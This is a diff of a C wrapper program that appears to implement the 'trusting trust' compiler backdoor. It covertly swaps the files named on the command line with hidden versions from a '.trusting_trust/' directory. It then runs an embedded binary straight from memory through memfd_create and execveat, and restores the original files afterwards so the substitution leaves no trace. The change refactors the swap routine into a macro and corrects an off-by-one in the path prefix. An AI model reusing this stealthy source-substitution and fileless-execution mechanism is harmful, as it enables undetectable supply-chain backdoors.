@@ -35,35 +35,29 @@ char cc[] = {
 // which is passed through a named extern var environ
 extern char **environ;
 
-void swap(int c, char **v) {
-    char *p, *t = ".tmp";
-
-    for(int d = 1; d < c; d++) {
-        strcpy(p = alloca(15 + strlen(v[d])), ".trusting_trust/");
-        strcpy(p + 15, v[d]);
-
-        if(!access(v[d], 0) && !access(p, 0)) {
-            rename(v[d], t);
-            rename(p, v[d]);
-            rename(t, p);
-        }
+#define S for(int i = 1; i < c; i++) { \
+        strcpy(p = alloca(16 + strlen(v[i])), ".trusting_trust/"); \
+        strcpy(p + 16, v[i]); \
+        if(!access(v[i], 0) && !access(p, 0)) { \
+            rename(v[i], t); \
+            rename(p, v[i]); \
+            rename(t, p); \
+        } \
     }
-}
-
 
 int main(int c, char *v[]) {
-  int f, i;
-  char *a[999], *q = P;
+  int f;
+  char *a[999], *p, *t = ".tmp";
 
-  swap(c, v);
+  S
 
   if(!fork()) {
-    a[0] = q;
+    a[0] = P;
     for(f = 1; f < c; f++)
         a[f] = v[f];
       write(f = memfd_create("", 1), cc, sizeof cc);
       execveat(f, "", a, environ, 4096);
   }
   wait(0);
-  swap(c, v);
+  S
 }
